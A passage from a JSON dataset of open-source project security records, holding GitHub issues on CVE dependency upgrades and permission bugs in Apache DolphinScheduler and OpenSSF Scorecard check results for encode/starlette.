Hotspot](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/security_hotspot-16px.png 'Security Hotspot')](https://sonarcloud.io/project/security_hotspots?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=SECURITY_HOTSPOT) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/security_hotspots?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=SECURITY_HOTSPOT) [0 Security Hotspots](https://sonarcloud.io/project/security_hotspots?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=SECURITY_HOTSPOT)  \n[![Code Smell](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/code_smell-16px.png 'Code Smell')](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=CODE_SMELL) [![D](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/D-16px.png 'D')](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=CODE_SMELL) [6 Code Smells](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=CODE_SMELL)\n\n[![66.7%](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/CoverageChart/60-16px.png '66.7%')](https://sonarcloud.io/component_measures?id=apache-dolphinscheduler&pullRequest=11589&metric=new_coverage&view=list) [66.7% Coverage](https://sonarcloud.io/component_measures?id=apache-dolphinscheduler&pullRequest=11589&metric=new_coverage&view=list)  \n[![0.0%](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/Duplications/3-16px.png '0.0%')](https://sonarcloud.io/component_measures?id=apache-dolphinscheduler&pullRequest=11589&metric=new_duplicated_lines_density&view=list) [0.0% Duplication](https://sonarcloud.io/component_measures?id=apache-dolphinscheduler&pullRequest=11589&metric=new_duplicated_lines_density&view=list)\n\n",
                        "user": "sonarcloud[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-11-24T06:09:58Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1325998973"
                    },
                    {
                        "body": "Hi, @caishunfeng , I've moved `SensitiveDataConverter` to `dolphinscheduler-common` module.\r\n\r\ncc @zhongjiajie ",
                        "user": "rickchengx",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-24T06:13:07Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1326001477"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/apache/dolphinscheduler/pulls/11589",
                    "merged_at": "2022-11-24T06:54:54Z"
                }
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/issues/10427",
                "title": "[Bug] [deps] Upgrade package version to avoid exists CVE issue",
                "labels": [
                    "bug",
                    "dependencies",
                    "security"
                ],
                "user": "zhongjiajie",
                "issue_author_association": "MEMBER",
                "number": 10427,
                "id": 1268970430,
                "state": "closed",
                "project_created_at": "2022-06-13T06:32:13Z",
                "closed_at": "2022-09-11T11:17:35Z",
                "body": "### Search before asking\n\n- [X] I had searched in the [issues](https://github.com/apache/dolphinscheduler/issues?q=is%3Aissue) and found no similar issues.\n\n\n### What happened\n\nAfter #10058 merged, we have CI to check our dependencies CVE issue to avoid adding some packages that have CVE issues. But we have many existing problem packages we have to upgrade. This issue points them up and track them until all done and OWASP CI pass\n\n### What you expected to happen\n\nATT\n\n### How to reproduce\n\nATT\n\n### Anything else\n\nATT\n\n### Version\n\ndev\n\n### Are you willing to submit PR?\n\n- [X] Yes I am willing to submit a PR!\n\n### Code of Conduct\n\n- [X] I agree to follow this project's [Code of Conduct](https://www.apache.org/foundation/policies/conduct)\n",
                "comments": [
                    {
                        "body": "Thank you for your feedback, we have received your issue, Please wait patiently for a reply.\n* In order for us to understand your request as soon as possible, please provide detailed information、version or pictures.\n* If you haven't received a reply for a long time, you can [join our slack](https://s.apache.org/dolphinscheduler-slack) and send your question to channel `#troubleshooting`",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-06-13T06:33:25Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/10427#issuecomment-1153527441"
                    },
                    {
                        "body": "Currently package need to be upgrade is below\r\n\r\n```log\r\nError:  api-util-1.0.0-M20.jar: CVE-2018-1337(9.8)\r\nError:  avro-1.7.4.jar: CVE-2021-43045(7.5)\r\nError:  cron-utils-9.1.3.jar: CVE-2021-41269(9.8)\r\nError:  gson-2.8.8.jar: CVE-2022-25647(7.5)\r\nError:  h2-1.4.200.jar: CVE-2022-23221(9.8), CVE-2021-23463(9.1), CVE-2021-42392(9.8)\r\nError:  hadoop-yarn-server-common-2.7.3.jar: CVE-2017-15718(9.8), CVE-2022-26612(9.8), CVE-2020-9492(8.8), CVE-2018-8029(8.8), CVE-2016-6811(8.8), CVE-2018-8009(8.8), CVE-2018-11768(7.5), CVE-2018-1296(7.5), CVE-2017-3166(7.8)\r\nError:  hive-jdbc-2.1.0.jar: CVE-2018-11777(8.1), CVE-2020-13949(7.5), CVE-2018-1282(9.1)\r\nError:  hive-orc-2.1.0.jar: CVE-2018-11777(8.1), CVE-2020-13949(7.5), CVE-2018-1282(9.1)\r\nError:  hive-storage-api-2.1.0.jar: CVE-2018-11777(8.1), CVE-2018-1282(9.1)\r\nError:  htrace-core-3.1.0-incubating.jar/META-INF/maven/com.fasterxml.jackson.core/jackson-databind/pom.xml: CVE-2017-7525(9.8), CVE-2018-7489(9.8), CVE-2020-35491(8.1), CVE-2020-35490(8.1), CVE-2020-36518(7.5)\r\nError:  jackson-databind-2.10.5.jar: CVE-2020-25649(7.5), CVE-2020-36518(7.5)\r\nError:  jackson-mapper-asl-1.9.13.jar: CVE-2017-7525(9.8), CVE-2019-10172(7.5)\r\nError:  libfb303-0.9.3.jar: CVE-2016-5397(8.8), CVE-2018-1320(7.5), CVE-2019-0210(7.5), CVE-2020-13949(7.5), CVE-2019-0205(7.5)\r\nError:  libthrift-0.9.3.jar: CVE-2016-5397(8.8), CVE-2018-1320(7.5), CVE-2019-0210(7.5), CVE-2020-13949(7.5), CVE-2019-0205(7.5)\r\nError:  log4j-1.2-api-2.14.1.jar: CVE-2021-44228(10.0), CVE-2021-45046(9.0)\r\nError:  log4j-1.2.17.jar: CVE-2021-4104(7.5), CVE-2020-9493(9.8), CVE-2022-23307(8.8), CVE-2022-23305(9.8), CVE-2019-17571(9.8), CVE-2022-23302(8.8)\r\nError:  mybatis-3.5.2.jar: CVE-2020-26945(8.1)\r\nError:  mybatis-plus-3.2.0.jar: CVE-2020-26945(8.1), CVE-2022-25517(9.8)\r\nError:  mybatis-plus-core-3.2.0.jar: CVE-2020-26945(8.1)\r\nError:  netty-3.6.2.Final.jar: CVE-2019-16869(7.5), CVE-2015-2156(7.5), CVE-2021-37136(7.5), CVE-2021-37137(7.5), CVE-2019-20445(9.1), CVE-2019-20444(9.1)\r\nError:  netty-all-4.1.53.Final.jar: CVE-2021-37136(7.5), CVE-2021-37137(7.5)\r\nError:  okhttp-3.14.9.jar: CVE-2021-0341(7.5)\r\nError:  pom.xml: CVE-2018-11804(7.5), CVE-2018-17190(9.8)\r\nError:  pom.xml: CVE-2018-11804(7.5), CVE-2018-17190(9.8)\r\nError:  snappy-0.2.jar: CVE-2018-6353(7.8)\r\nError:  spring-core-5.3.12.jar: CVE-2022-22965(9.8), CVE-2016-1000027(9.8)\r\nError:  spring-plugin-core-1.2.0.RELEASE.jar: CVE-2022-22965(9.8), CVE-2016-1000027(9.8)\r\nError:  spring-tx-5.3.12.jar: CVE-2022-22965(9.8), CVE-2016-1000027(9.8)\r\nError:  swagger-bootstrap-ui-1.9.3.jar: axios.min.js: CVE-2019-10742(7.5), CVE-2021-3749(7.5)\r\nError:  unirest-java-3.7.04-standalone.jar/META-INF/maven/com.google.code.gson/gson/pom.xml: CVE-2022-25647(7.5)\r\nError:  xercesImpl-2.9.1.jar: CVE-2012-0881(7.5), CVE-2013-4002(7.1)\r\n```",
                        "user": "zhongjiajie",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-06-13T06:34:48Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/10427#issuecomment-1153528407"
                    },
                    {
                        "body": "This issue has been automatically marked as stale because it has not had recent activity for 30 days. It will be closed in next 7 days if no further activity occurs.",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-07-14T00:25:15Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/10427#issuecomment-1183809631"
                    },
                    {
                        "body": "remove stale",
                        "user": "zhongjiajie",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-07-15T01:50:28Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/10427#issuecomment-1185087840"
                    },
                    {
                        "body": "Hi @zhongjiajie , I have working on this thing this time, I maybe can give some help",
                        "user": "qingwli",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-08-18T03:19:17Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/10427#issuecomment-1218999392"
                    },
                    {
                        "body": "> Hi @zhongjiajie , I have working on this thing this time, I maybe can give some help\r\n\r\nThanks for doing this, it is a good new for community",
                        "user": "zhongjiajie",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-08-28T05:36:45Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/10427#issuecomment-1229381102"
                    },
                    {
                        "body": "Currently nearly all dependencies with CVEs are upgraded to latest, some of the reported dependencies don't yet have released new version that fixes the CVE, so we have no way to deal with those dependencies for now. Now this should be a routine work and let's close this issue",
                        "user": "kezhenxu94",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-09-11T11:17:35Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/10427#issuecomment-1242941947"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/issues/9541",
                "title": "[Bug] upgrade spring due to cves",
                "labels": [
                    "bug",
                    "backend",
                    "Stale",
                    "security"
                ],
                "user": "pjfanning",
                "issue_author_association": "CONTRIBUTOR",
                "number": 9541,
                "id": 1206515336,
                "state": "closed",
                "project_created_at": "2022-04-17T23:50:58Z",
                "closed_at": "2022-07-08T00:25:44Z",
                "body": "### Search before asking\n\n- [X] I had searched in the [issues](https://github.com/apache/dolphinscheduler/issues?q=is%3Aissue) and found no similar issues.\n\n\n### What happened\n\nneed to use secure libs - https://mvnrepository.com/artifact/org.springframework/spring-core\n\n### What you expected to happen\n\nneed secure libs\n\n### How to reproduce\n\nn/a\n\n### Anything else\n\n_No response_\n\n### Version\n\ndev\n\n### Are you willing to submit PR?\n\n- [x] Yes I am willing to submit a PR!\n\n### Code of Conduct\n\n- [X] I agree to follow this project's [Code of Conduct](https://www.apache.org/foundation/policies/conduct)\n",
                "comments": [
                    {
                        "body": "Thank you for your feedback, we have received your issue, Please wait patiently for a reply.\n* In order for us to understand your request as soon as possible, please provide detailed information、version or pictures.\n* If you haven't received a reply for a long time, you can [join our slack](https://join.slack.com/t/asf-dolphinscheduler/shared_invite/zt-omtdhuio-_JISsxYhiVsltmC5h38yfw) and send your question to channel `#troubleshooting`",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-04-17T23:51:22Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/9541#issuecomment-1100970506"
                    },
                    {
                        "body": "@songjianet I had a look at https://github.com/apache/dolphinscheduler/pull/9542 but it's getting fairly messy. There is a pre-existing circular dependency between 2 spring beans - and newer versions of spring seem to be stricter about it.\r\n\r\nI'll probably need to leave this to someone who is more familiar with dolphinscheduler and testing it.",
                        "user": "pjfanning",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-04-18T21:02:29Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/9541#issuecomment-1101764925"
                    },
                    {
                        "body": "suggest springcore to 5.3.18\r\nrefer to https://mvnrepository.com/artifact/org.springframework/spring-core",
                        "user": "Tianqi-Dotes",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-04-20T11:02:37Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/9541#issuecomment-1103803389"
                    },
                    {
                        "body": "This issue has been automatically marked as stale because it has not had recent activity for 30 days. It will be closed in next 7 days if no further activity occurs.",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-05-21T00:20:41Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/9541#issuecomment-1133479556"
                    },
                    {
                        "body": "This issue has been closed because it has not received response for too long time. You could reopen it if you encountered similar problems in the future.",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-06-03T00:17:56Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/9541#issuecomment-1145465181"
                    },
                    {
                        "body": "This issue has been closed because it has not received response for too long time. You could reopen it if you encountered similar problems in the future.",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-06-23T00:18:10Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/9541#issuecomment-1163792778"
                    },
                    {
                        "body": "This issue has been closed because it has not received response for too long time. You could reopen it if you encountered similar problems in the future.",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-07-08T00:25:44Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/9541#issuecomment-1178399576"
                    },
                    {
                        "body": "remove stale",
                        "user": "zhongjiajie",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-07-08T02:53:39Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/9541#issuecomment-1178484227"
                    },
                    {
                        "body": "I raised https://github.com/apache/dolphinscheduler/issues/11897",
                        "user": "pjfanning",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-09-11T11:37:17Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/9541#issuecomment-1242945592"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/issues/8255",
                "title": "[Feature][python] Add authentication for python gateway server",
                "labels": [
                    "help wanted",
                    "feature",
                    "Python",
                    "security"
                ],
                "user": "zhongjiajie",
                "issue_author_association": "MEMBER",
                "number": 8255,
                "id": 1118109353,
                "state": "closed",
                "project_created_at": "2022-01-29T07:59:32Z",
                "closed_at": "2022-11-14T10:43:10Z",
                "body": "### Search before asking\n\n- [X] I had searched in the [issues](https://github.com/apache/dolphinscheduler/issues?q=is%3Aissue) and found no similar feature requirement.\n\n\n### Description\n\nseparate from #6407 . **Authentication**, add secret to ensure only trusted people could connect to gateway.\n\n### Use case\n\n_No response_\n\n### Related issues\n\n_No response_\n\n### Are you willing to submit a PR?\n\n- [ ] Yes I am willing to submit a PR!\n\n### Code of Conduct\n\n- [X] I agree to follow this project's [Code of Conduct](https://www.apache.org/foundation/policies/conduct)\n",
                "comments": [
                    {
                        "body": "Hi:\n* Thank you for your feedback, we have received your issue, Please wait patiently for a reply.\n* In order for us to understand your request as soon as possible, please provide detailed information、version or pictures.\n* If you haven't received a reply for a long time, you can subscribe to the developer's email，Mail subscription steps reference https://dolphinscheduler.apache.org/en-us/community/development/subscribe.html ,Then write the issue URL in the email content and send question to dev@dolphinscheduler.apache.org.",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-01-29T08:00:03Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/8255#issuecomment-1024861069"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/issues/7857",
                "title": "[Bug] [Edit User Info]  Problems caused by modifying the administrator user information.",
                "labels": [
                    "bug",
                    "security",
                    "release cherry-pick"
                ],
                "user": "songjianet",
                "issue_author_association": "MEMBER",
                "number": 7857,
                "id": 1095331823,
                "state": "closed",
                "project_created_at": "2022-01-06T13:41:11Z",
                "closed_at": "2022-01-08T10:01:22Z",
                "body": "### Search before asking\r\n\r\n- [X] I had searched in the [issues](https://github.com/apache/dolphinscheduler/issues?q=is%3Aissue) and found no similar issues.\r\n\r\n\r\n### What happened\r\n\r\n- User state\r\n\r\nWhen I logged in as an administrator, I modified the user information, changed the administrator's status to disabled, and modified the administrator's user name, all interfaces were unavailable.\r\n\r\n![image](https://user-images.githubusercontent.com/19239641/148392144-5ccf129a-4aa3-4a55-a86c-a370bdbe3896.png)\r\n\r\nThe same problem exists in the user management section.\r\n\r\n![image](https://user-images.githubusercontent.com/19239641/148484579-20de2dc2-5a15-4666-bcb0-015f79bdd4f2.png)\r\n\r\n- Authorized operation of admin user\r\n\r\nThe administrator should have all the permissions by default, and there is no need to perform authorization related operations.\r\n\r\n![image](https://user-images.githubusercontent.com/19239641/148484192-34750689-0bf5-4bdc-bbe1-ef23b8b56b7b.png)\r\n\r\n\r\n### What you expected to happen\r\n\r\nAdministrators cannot modify their own status, but they can modify the status of ordinary users. Ordinary users cannot modify their own status and the status of administrators and other ordinary users. The administrator does not need to assign any permissions to himself.\r\n\r\n### How to reproduce\r\n\r\nLog in with any identity to modify your personal status.\r\n\r\n### Anything else\r\n\r\n_No response_\r\n\r\n### Version\r\n\r\ndev\r\n\r\n### Are you willing to submit PR?\r\n\r\n- [ ] Yes I am willing to submit a PR!\r\n\r\n### Code of Conduct\r\n\r\n- [X] I agree to follow this project's [Code of Conduct](https://www.apache.org/foundation/policies/conduct)\r\n",
                "comments": [
                    {
                        "body": "Hi:\n* Thank you for your feedback, we have received your issue, Please wait patiently for a reply.\n* In order for us to understand your request as soon as possible, please provide detailed information、version or pictures.\n* If you haven't received a reply for a long time, you can subscribe to the developer's email，Mail subscription steps reference https://dolphinscheduler.apache.org/en-us/community/development/subscribe.html ,Then write the issue URL in the email content and send question to dev@dolphinscheduler.apache.org.",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-01-06T13:41:43Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/7857#issuecomment-1006601095"
                    },
                    {
                        "body": "I will fix this issue.",
                        "user": "calvinjiang",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-01-06T14:52:53Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/7857#issuecomment-1006652369"
                    },
                    {
                        "body": "I assigned to you",
                        "user": "zhongjiajie",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-01-06T15:06:03Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/7857#issuecomment-1006662554"
                    },
                    {
                        "body": "> I will fix this issue.\r\n\r\n@calvinjiang Do you have any plan about how to do it? It seems we have other permission issues like that, maybe we should consider them together. Such as https://github.com/apache/dolphinscheduler/issues/7288",
                        "user": "zhongjiajie",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-01-07T03:16:20Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/7857#issuecomment-1007108266"
                    },
                    {
                        "body": "@zhongjiajie I think that the user shouldn't have permission to disable its own account. But the account's name might need to be altered in some case. \r\n",
                        "user": "calvinjiang",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-01-07T11:06:16Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/7857#issuecomment-1007323333"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/issues/7503",
                "title": "[Feature][Common]Plaintext password",
                "labels": [
                    "feature",
                    "Waiting for reply",
                    "security"
                ],
                "user": "rwyw",
                "issue_author_association": "NONE",
                "number": 7503,
                "id": 1084479107,
                "state": "closed",
                "project_created_at": "2021-12-20T08:06:09Z",
                "closed_at": "2024-07-17T09:41:24Z",
                "body": "### Search before asking\n\n- [X] I had searched in the [issues](https://github.com/apache/dolphinscheduler/issues?q=is%3Aissue) and found no similar feature requirement.\n\n\n### Description\n\nTo encrypt the password during network transmission (prevent packet capture), such as user login, datasource account information transmission and storage, etc\n\n### Use case\n\n_No response_\n\n### Related issues\n\n_No response_\n\n### Are you willing to submit a PR?\n\n- [ ] Yes I am willing to submit a PR!\n\n### Code of Conduct\n\n- [X] I agree to follow this project's [Code of Conduct](https://www.apache.org/foundation/policies/conduct)\n",
                "comments": [
                    {
                        "body": "Hi:\n* Thank you for your feedback, we have received your issue, Please wait patiently for a reply.\n* In order for us to understand your request as soon as possible, please provide detailed information、version or pictures.\n* If you haven't received a reply for a long time, you can subscribe to the developer's email，Mail subscription steps reference https://dolphinscheduler.apache.org/en-us/community/development/subscribe.html ,Then write the issue URL in the email content and send question to dev@dolphinscheduler.apache.org.",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2021-12-20T08:06:45Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/7503#issuecomment-997687151"
                    },
                    {
                        "body": "@rwyw \r\ngood idea, would you please submit a pr for this?",
                        "user": "lenboo",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-12-20T15:55:47Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/7503#issuecomment-998051004"
                    }
                ],
                "pull_request": null
            }
        ],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 10,
        "num_noncompliant_security_pull": 3,
        "has_generic_policy": true
    },
    {
        "project_name": "encode/starlette",
        "project_url": "https://github.com/encode/starlette",
        "SSF": {
            "date": "2024-10-29T21:10:28+07:00",
            "repo": {
                "name": "github.com/encode/starlette",
                "commit": "afeb7c2d12784a3b25df7e0ec9ea28e5f52c8c7d"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 6.6,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'master'",
                        "Info: 'force pushes' disabled on branch 'master'",
                        "Warn: required approving review count is 1 on branch 'master'",
                        "Warn: codeowners review is not required on branch 'master'",
                        "Info: status check found to merge onto on branch 'master'",
                        "Info: PRs are required in order to make changes on branch 'master'"
                    ],
                    "score": 8,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "29 out of 29 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 3,
                    "reason": "Found 11/28 approved changesets -- score normalized to 3",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: realpython contributor org/company found, Forethought-Technologies contributor org/company found, not-kennethreitz contributor org/company found, datasette contributor org/company found, py-bson contributor org/company found, yelp contributor org/company found, jupyterlab contributor org/company found, octo browser contributor org/company found, encode @fishaudio contributor org/company found, pydantic contributor org/company found, whissip contributor org/company found, testbed contributor org/company found, python-trio contributor org/company found, PyCQA contributor org/company found, commitizen-tools contributor org/company found, buttars professional . contributor org/company found, pytest-dev contributor org/company found, bocadilloproject contributor org/company found, mkdocs contributor org/company found, yourlabs contributor org/company found, freelancer up for hire contributor org/company found, dask contributor org/company found, mobile vikings contributor org/company found, piccolo-orm contributor org/company found, neomake contributor org/company found, canvg contributor org/company found, fastapi contributor org/company found, encode @pydantic contributor org/company found, awesomeWM contributor org/company found, nteract contributor org/company found, senseta-os contributor org/company found, twisted contributor org/company found, kpn contributor org/company found, pterodactyl contributor org/company found, encode contributor org/company found, pawamoy-insiders contributor org/company found, sqlalchemy-redshift contributor org/company found, mulligan funding contributor org/company found, encode oss contributor org/company found, python-arq contributor org/company found, strawberry-graphql contributor org/company found, fairnesscoop contributor org/company found, asnible contributor org/company found, snowcap contributor org/company found, django contributor org/company found, didcot-data contributor org/company found, GoodSpeech contributor org/company found, Vimjas contributor org/company found, jazzband contributor org/company found, pypy contributor org/company found, Docker-s-IMAGES contributor org/company found, python-attrs contributor org/company found, conda-forge contributor org/company found, ray-project contributor org/company found, Aber-s-practice contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 55 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE.md:0",
                        "Info: FSF or OSI recognized license: BSD 3-Clause \"New\" or \"Revised\" License: LICENSE.md:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 20 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish.yml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/encode/starlette/publish.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish.yml:18: update your workflow using https://app.stepsecurity.io/secureworkflow/encode/starlette/publish.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test-suite.yml:20: update your workflow using https://app.stepsecurity.io/secureworkflow/encode/starlette/test-suite.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test-suite.yml:21: update your workflow using https://app.stepsecurity.io/secureworkflow/encode/starlette/test-suite.yml/master?enable=pin",
                        "Info:   0 out of   4 GitHub-owned GitHubAction dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 29 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: github.com/encode/.github/SECURITY.md:1",
                        "Info: Found linked content: github.com/encode/.github/SECURITY.md:1",
